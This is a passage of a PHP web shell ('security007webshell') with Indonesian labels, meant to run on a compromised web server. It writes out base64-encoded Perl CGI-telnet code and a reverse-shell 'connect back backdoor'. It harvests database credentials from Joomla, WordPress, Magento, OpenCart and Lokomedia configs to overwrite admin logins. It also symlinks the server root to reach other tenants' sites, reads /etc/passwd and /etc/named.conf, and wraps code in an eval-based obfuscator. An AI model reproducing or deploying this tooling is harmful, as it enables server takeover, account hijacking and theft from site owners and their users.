ZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7Cgl9CgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQoJewoJCSZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlLiBJZiB0aGUKIyBmaWxlIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGEKIyBmaWxlLCBvdGhlcndpc2UgaXQgc3RhcnRzIHRoZSB1cGxvYWQgcHJvY2Vzcy4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgVXBsb2FkRmlsZQp7CgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgdXBsb2FkIGZvcm0gYWdhaW4KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpCgl7CgkJJlByaW50UGFnZUhlYWRlcigiZiIpOwoJCSZQcmludEZpbGVVcGxvYWRGb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7CgkJcmV0dXJuOwoJfQoJJlByaW50UGFnZUhlYWRlcigiYyIpOwoKCSMgc3RhcnQgdGhlIHVwbG9hZGluZyBwcm9jZXNzCglwcmludCAiPGNvZGU+VXBsb2FkaW5nICRUcmFuc2ZlckZpbGUgdG8gJEN1cnJlbnREaXIuLi48YnI+IjsKCgkjIGdldCB0aGUgZnVsbGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBjcmVhdGVkCgljaG9wKCRUYXJnZXROYW1lKSBpZiAoJFRhcmdldE5hbWUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsKCSRUcmFuc2ZlckZpbGUgPX4gbSEoW14vXlxcXSopJCE7CgkkVGFyZ2V0TmFtZSAuPSAkUGF0aFNlcC4kMTsKCgkkVGFyZ2V0RmlsZVNpemUgPSBsZW5ndGgoJGlueydmaWxlZGF0YSd9KTsKCSMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdAoJaWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpCgl7CgkJcHJpbnQgIkZhaWxlZDogRGVzdGluYXRpb24gZmlsZSBhbHJlYWR5IGV4aXN0cy48YnI+IjsKCX0KCWVsc2UgIyBmaWxlIGlzIG5vdCBwcmVzZW50Cgl7CgkJaWYob3BlbihVUExPQURGSUxFLCAiPiRUYXJnZXROYW1lIikpCgkJewoJCQliaW5tb2RlKFVQTE9BREZJTEUpIGlmICRXaW5OVDsKCQkJcHJpbnQgVVBMT0FERklMRSAkaW57J2ZpbGVkYXRhJ307CgkJCWNsb3NlKFVQTE9BREZJTEUpOwoJCQlwcmludCAiVHJhbnNmZXJlZCAkVGFyZ2V0RmlsZVNpemUgQnl0ZXMuPGJyPiI7CgkJCXByaW50ICJGaWxlIFBhdGg6ICRUYXJnZXROYW1lPGJyPiI7CgkJfQoJCWVsc2UKCQl7CgkJCXByaW50ICJGYWlsZWQ6ICQhPGJyPiI7CgkJfQoJfQoJcHJpbnQgIjwvY29kZT4iOwoJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkmUHJpbnRQYWdlRm9vdGVyOwp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byBkb3dubG9hZCBhIGZpbGUuIElmIHRoZQojIGZpbGVuYW1lIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGEKIyBmaWxlLCBvdGhlcndpc2UgaXQgZGlzcGxheXMgYSBtZXNzYWdlIHRvIHRoZSB1c2VyIGFuZCBwcm92aWRlcyBhIGxpbmsKIyB0aHJvdWdoICB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgRG93bmxvYWRGaWxlCnsKCSMgaWYgbm8gZmlsZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSBkb3dubG9hZCBmb3JtIGFnYWluCglpZigkVHJhbnNmZXJGaWxlIGVxICIiKQoJewoJCSZQcmludFBhZ2VIZWFkZXIoImYiKTsKCQkmUHJpbnRGaWxlRG93bmxvYWRGb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7CgkJcmV0dXJuOwoJfQoJCgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwKCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUKCXsKCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7Cgl9CgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQoJewoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87CgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsKCX0KCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQoJewoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7Cgl9CgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQoJewoJCSZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgTWFpbiBQcm9ncmFtIC0gRXhlY3V0aW9uIFN0YXJ0cyBIZXJlCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KJlJlYWRQYXJzZTsKJkdldENvb2tpZXM7CgokU2NyaXB0TG9jYXRpb24gPSAkRU5WeydTQ1JJUFRfTkFNRSd9OwokU2VydmVyTmFtZSA9ICRFTlZ7J1NFUlZFUl9OQU1FJ307CiRMb2dpblBhc3N3b3JkID0gJGlueydwJ307CiRSdW5Db21tYW5kID0gJGlueydjJ307CiRUcmFuc2ZlckZpbGUgPSAkaW57J2YnfTsKJE9wdGlvbnMgPSAkaW57J28nfTsKCiRBY3Rpb24gPSAkaW57J2EnfTsKJEFjdGlvbiA9ICJsb2dpbiIgaWYoJEFjdGlvbiBlcSAiIik7ICMgbm8gYWN0aW9uIHNwZWNpZmllZCwgdXNlIGRlZmF1bHQKCiMgZ2V0IHRoZSBkaXJlY3RvcnkgaW4gd2hpY2ggdGhlIGNvbW1hbmRzIHdpbGwgYmUgZXhlY3V0ZWQKJEN1cnJlbnREaXIgPSAkaW57J2QnfTsKY2hvcCgkQ3VycmVudERpciA9IGAkQ21kUHdkYCkgaWYoJEN1cnJlbnREaXIgZXEgIiIpOwoKJExvZ2dlZEluID0gJENvb2tpZXN7J1NBVkVEUFdEJ30gZXEgJFBhc3N3b3JkOwoKaWYoJEFjdGlvbiBlcSAibG9naW4iIHx8ICEkTG9nZ2VkSW4pICMgdXNlciBuZWVkcy9oYXMgdG8gbG9naW4KewoJJlBlcmZvcm1Mb2dpbjsKfQplbHNpZigkQWN0aW9uIGVxICJjb21tYW5kIikgIyB1c2VyIHdhbnRzIHRvIHJ1biBhIGNvbW1hbmQKewoJJkV4ZWN1dGVDb21tYW5kOwp9CmVsc2lmKCRBY3Rpb24gZXEgInVwbG9hZCIpICMgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlCnsKCSZVcGxvYWRGaWxlOwp9CmVsc2lmKCRBY3Rpb24gZXEgImRvd25sb2FkIikgIyB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZQp7CgkmRG93bmxvYWRGaWxlOwp9CmVsc2lmKCRBY3Rpb24gZXEgImxvZ291dCIpICMgdXNlciB3YW50cyB0byBsb2dvdXQKewoJJlBlcmZvcm1Mb2dvdXQ7Cn0K';

$file = fopen("izo.cin" ,"w+");
$write = fwrite ($file ,base64_decode($cgishellizocin));
fclose($file);
    chmod("izo.cin",0755);
$netcatshell = 'IyEvdXNyL2Jpbi9wZXJsDQogICAgICB1c2UgU29ja2V0Ow0KICAgICAgcHJpbnQgIkRhdGEgQ2hh
MHMgQ29ubmVjdCBCYWNrIEJhY2tkb29yXG5cbiI7DQogICAgICBpZiAoISRBUkdWWzBdKSB7DQog
ICAgICAgIHByaW50ZiAiVXNhZ2U6ICQwIFtIb3N0XSA8UG9ydD5cbiI7DQogICAgICAgIGV4aXQo
MSk7DQogICAgICB9DQogICAgICBwcmludCAiWypdIER1bXBpbmcgQXJndW1lbnRzXG4iOw0KICAg
ICAgJGhvc3QgPSAkQVJHVlswXTsNCiAgICAgICRwb3J0ID0gODA7DQogICAgICBpZiAoJEFSR1Zb
MV0pIHsNCiAgICAgICAgJHBvcnQgPSAkQVJHVlsxXTsNCiAgICAgIH0NCiAgICAgIHByaW50ICJb
Kl0gQ29ubmVjdGluZy4uLlxuIjsNCiAgICAgICRwcm90byA9IGdldHByb3RvYnluYW1lKCd0Y3An
KSB8fCBkaWUoIlVua25vd24gUHJvdG9jb2xcbiIpOw0KICAgICAgc29ja2V0KFNFUlZFUiwgUEZf
SU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllICgiU29ja2V0IEVycm9yXG4iKTsNCiAg
ICAgIG15ICR0YXJnZXQgPSBpbmV0X2F0b24oJGhvc3QpOw0KICAgICAgaWYgKCFjb25uZWN0KFNF
UlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsICR0YXJnZXQpKSB7DQogICAgICAgIGRpZSgi
VW5hYmxlIHRvIENvbm5lY3RcbiIpOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBTcGF3bmlu
ZyBTaGVsbFxuIjsNCiAgICAgIGlmICghZm9yayggKSkgew0KICAgICAgICBvcGVuKFNURElOLCI+
JlNFUlZFUiIpOw0KICAgICAgICBvcGVuKFNURE9VVCwiPiZTRVJWRVIiKTsNCiAgICAgICAgb3Bl
bihTVERFUlIsIj4mU0VSVkVSIik7DQogICAgICAgIGV4ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAu
ICJcMCIgeCA0Ow0KICAgICAgICBleGl0KDApOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBE
YXRhY2hlZFxuXG4iOw==';

$file = fopen("dc.pl" ,"w+");
$write = fwrite ($file ,base64_decode($netcatshell));
fclose($file);
    chmod("dc.pl",0755);
   echo "<iframe src=cgitelnet1/izo.cin width=96% height=90% frameborder=0></iframe> 

 
 </div>"; }
 elseif(isset($_GET['adminer'])) {
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')) {
		echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
	} else {
		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
			echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
		} else {
			echo "<center><font color=red>gagal buat file adminer</font></center>";
		}
	}
}elseif(isset($_GET['autoedit'])) {
	if(isset($_POST['hajar'])) {
		if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
			echo "username atau password harus lebih dari 6 karakter";
		} else {
			$user_baru = $_POST['user_baru'];
			$pass_baru = md5($_POST['pass_baru']);
			$conf = $_POST['config_dir'];
			$scan_conf = scandir($conf);
			foreach($scan_conf as $file_conf) {
				if(!is_file("$conf/$file_conf")) continue;
				$config = file_get_contents("$conf/$file_conf");
				if(preg_match("/JConfig|joomla/",$config)) {
					$dbhost = ambilkata($config,"host = '","'");
					$dbuser = ambilkata($config,"user = '","'");
					$dbpass = ambilkata($config,"password = '","'");
					$dbname = ambilkata($config,"db = '","'");
					$dbprefix = ambilkata($config,"dbprefix = '","'");
					$prefix = $dbprefix."users";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result['id'];
					$site = ambilkata($config,"sitename = '","'");
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Joomla<br>";
					if($site == '') {
						echo "Sitename => <font color=yellow>error, gabisa ambil nama domain nya</font><br>";
					} else {
						echo "Sitename => $site<br>";
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=yellow>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=blue>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/WordPress/",$config)) {
					$dbhost = ambilkata($config,"DB_HOST', '","'");
					$dbuser = ambilkata($config,"DB_USER', '","'");
					$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"DB_NAME', '","'");
					$dbprefix = ambilkata($config,"table_prefix  = '","'");
					$prefix = $dbprefix."users";
					$option = $dbprefix."options";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[ID];
					$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[option_value];
					if($target == '') {
						$url_target = "Login => <font color=yellow>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Wordpress<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=yellow>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=blue>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/Magento|Mage_Core/",$config)) {
					$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
					$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
					$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
					$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
					$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
					$prefix = $dbprefix."admin_user";
					$option = $dbprefix."core_config_data";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[value];
					if($target == '') {
						$url_target = "Login => <font color=yellow>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Magento<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
					$dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
					$dbuser = ambilkata($config,"'DB_USERNAME', '","'");
					$dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"'DB_DATABASE', '","'");
					$dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
					$prefix = $dbprefix."user";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$target = ambilkata($config,"HTTP_SERVER', '","'");
					if($target == '') {
						$url_target = "Login => <font color=yellow>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => OpenCart<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=yellow>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=blue>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
					$dbhost = ambilkata($config,'server = "','"');
					$dbuser = ambilkata($config,'username = "','"');
					$dbpass = ambilkata($config,'password = "','"');
					$dbname = ambilkata($config,'database = "','"');
					$prefix = "users";
					$option = "identitas";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
					$result = mysql_fetch_array($q);
					$target = $result[alamat_website];
					if($target == '') {
						$target2 = $result[url];
						$url_target = "Login => <font color=yellow>error, gabisa ambil nama domain nyaa</font><br>";
						if($target2 == '') {
							$url_target2 = "Login => <font color=yellow>error, gabisa ambil nama domain nyaa</font><br>";
						} else {
							$cek_login3 = file_get_contents("$target2/adminweb/");
							$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
							if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
								$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
							} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
								$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
							} else {
								$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
							}
						}
					} else {
						$cek_login = file_get_contents("$target/adminweb/");
						$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
						if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
							$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
						} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
							$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
						} else {
							$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
						}
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Lokomedia<br>";
					if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
						echo $url_target2;
					} else {
						echo $url_target;
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit User Config</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='sec007' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='sec007' placeholder='pass_baru'><br>
		<input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
		</form>
		<span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
		";
	}
}



// Edit File

else if(isset($_POST['file']) &&
        isset($_POST['content']) )
{
    if(is_dir($_POST['file']))
    {
        header("location:".$self."?dir=".$_POST['file']);
    }
    if(file_exists($_POST['file']))
    {
        $handle = fopen($_POST['file'],"w");
	if (!handle) echo "<p class='alert_red'>Permission Denied</p>";
	else {
        	fwrite($handle,$_POST['content']);
        	echo "Your changes were Successfully Saved!";
        }
    }
    else
    {
        echo "<p class='alert_red'>File Name Specified does not exists!</p>";
    }
}

// PHP Obfuscator

else if(isset($_GET['obfuscate']))
{
    if ( isset($_POST['code']) &&
               $_POST['code'] != '')
    {
        $encoded = base64_encode(gzdeflate(trim(stripslashes($_POST['code'].' '),'<?php,?>'),9)); // high Compression! :P
        $encode = '
<?php
$encoded = \''.$encoded.'\';
eval(gzinflate(base64_decode($encoded)));
// Script Encoded by security007webshell 
?>
';
    }
    else
    {
        $encode = 'Please Enter your Code! and Click Submit! :)';    
    }?>
    <form method="POST">
        <textarea class="cmd" cols="100" rows="20" name="code"><?php echo $encode;?></textarea><br />
        <input style="margin: 20px; margin-left: 50px; padding: 10px;"  class="own"  type="submit" value="Encode :D"/>
    </form>
    
    <?php
}elseif(isset($_GET['sym']))
{	
@set_time_limit(0);

echo "<br><br><center><h1>Symlink by security007</h1></center><br><br><center><div class=content>";

@mkdir('sym',0777);
$htaccess  = "Options all n DirectoryIndex Sux.html n AddType text/plain .php n AddHandler server-parsed .php n  AddType text/plain .html n AddHandler txt .html n Require None n Satisfy Any";
$write =@fopen ('sym/.htaccess','w');
fwrite($write ,$htaccess);
@symlink('/','sym/root');
$filelocation = basename(__FILE__);
$read_named_conf = @file('/etc/named.conf');
if(!$read_named_conf)
{
echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>"; 
}
else
{
echo "<br><br><div class='tmp'><table border='1' bordercolor='white' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
foreach($read_named_conf as $subject){
if(eregi('zone',$subject)){
preg_match_all('#zone "(.*)"#',$subject,$string);
flush();
if(strlen(trim($string[1][0])) >2){
$UID = posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0]));
$name = $UID['name'] ;
@symlink('/','sym/root');
$name   = $string[1][0];
$iran   = '.ir';
$israel = '.il';
$indo   = '.id';
$sg12   = '.sg';
$edu    = '.edu';
$gov    = '.gov';
$gose   = '.go';
$gober  = '.gob';
$mil1   = '.mil';
$mil2   = '.mi';
$malay	= '.my';
$china	= '.cn';
$japan	= '.jp';
$austr	= '.au';
$porn	= '.xxx';
$as		= '.uk';
$calfn	= '.ca';

if (eregi("$iran",$string[1][0]) or eregi("$israel",$string[1][0]) or eregi("$indo",$string[1][0])or eregi("$sg12",$string[1][0]) or eregi ("$edu",$string[1][0]) or eregi ("$gov",$string[1][0])
or eregi ("$gose",$string[1][0]) or eregi("$gober",$string[1][0]) or eregi("$mil1",$string[1][0]) or eregi ("$mil2",$string[1][0])
or eregi ("$malay",$string[1][0]) or eregi("$china",$string[1][0]) or eregi("$japan",$string[1][0]) or eregi ("$austr",$string[1][0])
or eregi("$porn",$string[1][0]) or eregi("$as",$string[1][0]) or eregi ("$calfn",$string[1][0]))
{
$name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$string[1][0].'</div>';
}
echo "
<tr>

<td>
<div class='dom'><a target='_blank' href=http://www.".$string[1][0].'/>'.$name.' </a> </div>
</td>

<td>
'.$UID['name']."
</td>

<td>
<a href='sym/root/home/".$UID['name']."/public_html' target='_blank'>Symlink </a>
</td>

</tr></div> ";
flush();
}
}
}
}

echo "</center></table>";   


}elseif(isset($_GET['python_sym'])){
	echo "
	<form method='post'>
	<h1><code>Bypass Symlink</code></h1><br>
	<input class='own' name='submit' type='Submit' value='Bypass IT' style='border-color:silver'/>
	</form>
	</center>";
	if ($_POST['submit']){
		$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
		$py = "Iy8qUHl0aG9uCgppbXBvcnQgdGltZQppbXBvcnQgb3MKaW1wb3J0IHN5cwppbXBvcnQgcmUKCm9zLnN5c3RlbSgiY29sb3IgQyIpCgpodGEgPSAiXG5GaWxlIDogLmh0YWNjZXNzIC8vIENyZWF0ZWQgU3VjY2Vzc2Z1bGx5IVxuIgpmID0gIkFsbCBQcm9jZXNzZXMgRG9uZSFcblN5bWxpbmsgQnlwYXNzZWQgU3VjY2Vzc2Z1bGx5IVxuIgpwcmludCAiXG4iCnByaW50ICJ+Iio2MApwcmludCAiU3ltbGluayBCeXBhc3MgMjAxNCBieSBNaW5kbGVzcyBJbmplY3RvciAiCnByaW50ICIgICAgICAgICAgICAgIFNwZWNpYWwgR3JlZXR6IHRvIDogUGFrIEN5YmVyIFNrdWxseiIKcHJpbnQgIn4iKjYwCgpvcy5tYWtlZGlycygndHJqbngnKQpvcy5jaGRpcigndHJqbngnKQoKc3Vzcj1bXQpzaXRleD1bXQpvcy5zeXN0ZW0oImxuIC1zIC8gdHIudHh0IikKCmggPSAiT3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzXG5EaXJlY3RvcnlJbmRleCB0ci5waHRtbFxuQWRkVHlwZSB0eHQgLnBocFxuQWRkSGFuZGxlciB0eHQgLnBocCIKbSA9IG9wZW4oIi5odGFjY2VzcyIsIncrIikKbS53cml0ZShoKQptLmNsb3NlKCkKcHJpbnQgaHRhCgpzZiA9ICI8aHRtbD48dGl0bGU+U3ltbGluayBCeXBhc3MgMjAxNyBieSBNaW5kbGVzcyBJbmplY3RvcjwvdGl0bGU+PGNlbnRlcj48Zm9udCBjb2xvcj1ibGFjayBzaXplPTU+U3ltbGluayBCeXBhc3MgMjAxNzxicj48Zm9udCBzaXplPTQ+TWFkZSBCeSBNaW5kbGVzcyBJbmplY3RvciA8YnI+SWRlYSBCeSBNeSBNaW5kPC9mb250PjwvZm9udD48YnI+PGZvbnQgY29sb3I9YmxhY2sgc2l6ZT0zPjx0YWJsZT4iCgpvID0gb3BlbignL2V0Yy9wYXNzd2QnLCdyJykKbz1vLnJlYWQoKQpvID0gcmUuZmluZGFsbCgnL2hvbWUvXHcrJyxvKQoKZm9yIHh1c3IgaW4gbzoKCXh1c3I9eHVzci5yZXBsYWNlKCcvaG9tZS8nLCcnKQoJc3Vzci5hcHBlbmQoeHVzcikKcHJpbnQgIi0iKjMwCnhzaXRlID0gb3MubGlzdGRpcigiL3Zhci9uYW1lZCIpCgpmb3IgeHhzaXRlIGluIHhzaXRlOgoJeHhzaXRlPXh4c2l0ZS5yZXBsYWNlKCIuZGIiLCIiKQoJc2l0ZXguYXBwZW5kKHh4c2l0ZSkKcHJpbnQgZgpwYXRoPW9zLmdldGN3ZCgpCmlmICIvcHVibGljX2h0bWwvIiBpbiBwYXRoOgoJcGF0aD0iL3B1YmxpY19odG1sLyIKZWxzZToKCXBhdGggPSAiL2h0bWwvIgpjb3VudGVyPTEKaXBzPW9wZW4oInRyLnBodG1sIiwidyIpCmlwcy53cml0ZShzZikKCmZvciBmdXNyIGluIHN1c3I6Cglmb3IgZnNpdGUgaW4gc2l0ZXg6CgkJZnU9ZnVzclswOjVdCgkJcz1mc2l0ZVswOjVdCgkJaWYgZnU9PXM6CgkJCWlwcy53cml0ZSgiPHRyPjx0ZCBzdHlsZT1mb250LWZhbWlseTpjYWxpYnJpO2ZvbnQtd2VpZ2h0OmJvbGQ7Y29sb3I6YmxhY2s7PiVzPC9